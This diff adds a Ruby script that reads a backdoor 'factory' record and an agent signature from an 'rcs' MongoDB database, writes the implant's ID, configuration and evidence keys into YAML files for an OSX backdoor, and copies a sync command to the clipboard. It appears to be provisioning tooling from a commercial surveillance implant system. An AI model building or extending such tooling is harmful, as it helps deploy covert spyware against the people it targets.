@@ -1,0 +1,115 @@
+#!/usr/bin/env ruby
+# encoding: utf-8
+
+require 'yaml'
+require 'pry'
+require 'json'
+require 'moped'
+require 'digest/sha1'
+require 'optparse'
+
+ARGV << "--help" if ARGV.empty?
+
+$options = {db_addr: 'localhost'}
+
+OptionParser.new do |parser|
+  parser.banner = "Add configuration entry for a new backdoor"
+
+  parser.on("-d", "--db ADDR", "Default is localhost. Specify db addr") do |addr|
+    $options[:db_addr] = addr
+  end
+
+  parser.on("-n", "--name FACTORY_NAME", "Specify the factory name") do |name|
+    $options[:factory_name] = name
+  end
+end.parse!
+
+def db_address
+  "#{db_host}:27017"
+end
+
+def db_host
+  $options[:db_addr]
+end
+
+def session
+  @session ||= begin
+    session = Moped::Session.new([db_address])
+    session.use('rcs')
+    session
+  end
+end
+
+def can_reach_db?
+  session.collections.count rescue nil
+end
+
+def factory_name
+  $options[:factory_name]
+end
+
+def factory
+  @factory ||= session['items'].find({_kind: 'factory', name: factory_name}).first
+end
+
+def signature
+  doc = session['signatures'].find(scope: 'agent').first
+  doc['value'].to_s if doc
+end
+
+def append_configuration(filename, hash)
+  path = File.expand_path("../#{filename}", __FILE__)
+  raise("Unable to find file #{path}") unless File.exists?(path)
+  raise("#{filename} already has an entry named #{entry_name.inspect}") if File.read(path) =~ /#{entry_name}/i
+
+  File.open(path, 'a') do |f|
+    f.write("\n")
+    f.write("#{entry_name}:\n")
+    hash.each { |key, value| f.write("  #{key}: #{value}\n") }
+  end
+end
+
+def entry_name
+  "fac_" << factory_name.to_s.downcase.gsub(/[^a-z0-9]/, '').strip
+end
+
+def update_binary_yaml
+  hash = {
+    :BACKDOOR_ID    => factory['ident'],
+    :BACKDOOR_TYPE  => 'OSX',
+    :CONF_KEY       => factory['confkey'],
+    :EVIDENCE_KEY   => factory['logkey'],
+    :SIGNATURE      => signature,
+    :VERSION        => 2013103101
+  }
+
+  append_configuration('binary.yaml', hash)
+end
+
+def instance_id
+  @instance_id ||= Digest::SHA1.hexdigest(rand(1E20).to_s)
+end
+
+def update_ident_yaml
+  hash = {
+    :INSTANCE_ID  => instance_id,
+    :USERID       => "topac#{rand(1E5)}",
+    :DEVICEID     => '',
+    :SOURCEID     => '',
+  }
+
+  append_configuration("ident.yaml", hash)
+end
+
+raise "Unable to connect to database #{db_address.inspect}" unless can_reach_db?
+raise "Unable to find factory name #{factory_name.inspect}" unless factory
+raise "Unable to find agent signature in db #{db_address.inspect}" unless signature
+
+update_binary_yaml
+update_ident_yaml
+
+puts "Configuration entry added to binary.yaml and ident.yaml"
+cmd = "./bin/rcs-backdoor -s #{db_host} -c #{entry_name}"
+puts "Try to sync with the command #{cmd} (the command has been copied on clipboard)"
+
+exec("echo '#{cmd}' | pbcopy")
